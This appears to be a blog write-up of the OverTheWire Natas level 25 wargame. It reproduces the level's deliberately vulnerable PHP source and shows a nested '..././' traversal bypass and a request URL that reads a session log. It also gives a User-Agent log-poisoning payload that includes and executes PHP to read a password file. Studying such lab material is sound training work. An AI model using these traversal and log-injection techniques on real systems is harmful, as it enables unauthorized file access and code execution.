---
layout: post
title:  "Natas25: Bypassing Protections"
date:   2017-10-16 14:15:50 -0400
categories: master
---

The source code:

```
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html> 
```

This level is a two-parter that involves bypassing both directory traversal protection and file-access protection.


The php code starts off with:
```
    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
```
This code returns the contents of a file in the `language/` directory. If the url parameter `lang` is set to `en`, it returns the contents of the file `language/en`, which contains a quote. If lang=de, it outputs the file `language/de` which is the German version of the same quote (assumably).

The thing to take away from this is that the `lang` variable is retrieving the contents of a file. If we can bypass the two checks in the function `safeinclude()`, we can use this to retrieve the natas26 password file.

The first check is a directory traversal check. The code related is below:
```
// check for directory traversal
if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
}
```
We can bypass this by embedding a `../` inside of another `../`:
```
..././..././..././..././..././
```
The code will detect and remove the embedded `../`, and fails to check the results for further directory traversal attempts.

So the result after removal will be:
```
../../../
```
Which is exactly what we want.

Also included in the php code is a log function that will log the date, time, and user-agent string if a directory traversal attack is detected:
```
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
}
```

Retrieve the cookie using any cookie viewer such as Firefox's Cookie Manager+. In my case, my PHPSESSID cookie is `97aodk3p7v5hit1nn3ink0sas5`. Using the directory traversal bypass above will allow us to read our own logs. For example, the url to retrive my log would be:
```
http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_97aodk3p7v5hit1nn3ink0sas5.log
```

Which has listed the following:
```
[16.10.2017 16::39:27] Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0 
"Directory traversal attempt! fixing request."
[16.10.2017 16::40:57] Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0 
"Directory traversal attempt! fixing request." 
```

This code will input anything from the user-agent, which we can modify, to the log. Since we cannot directly access the natas26 password file, we can instead inject a simple php script into the user-agent that will print the contents of the file into the log.

Using a tool like the Firefox addon Tamper Data, we can input the following php script into the user-agent field:
```
<?php $test = file_get_contents("/etc/natas_webpass/natas26"); echo $test ?>
```

Which will store the password into the log file when we attempt another directory traversal attack:
```
[16.10.2017 16::39:27] Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0 
"Directory traversal attempt! fixing request." 
[16.10.2017 16::40:57] Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0 
"Directory traversal attempt! fixing request." 
[16.10.2017 16::47:13] [password]
"Directory traversal attempt! fixing request." 
[16.10.2017 16::47:20] Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0 
"Directory traversal attempt! fixing request." 
```
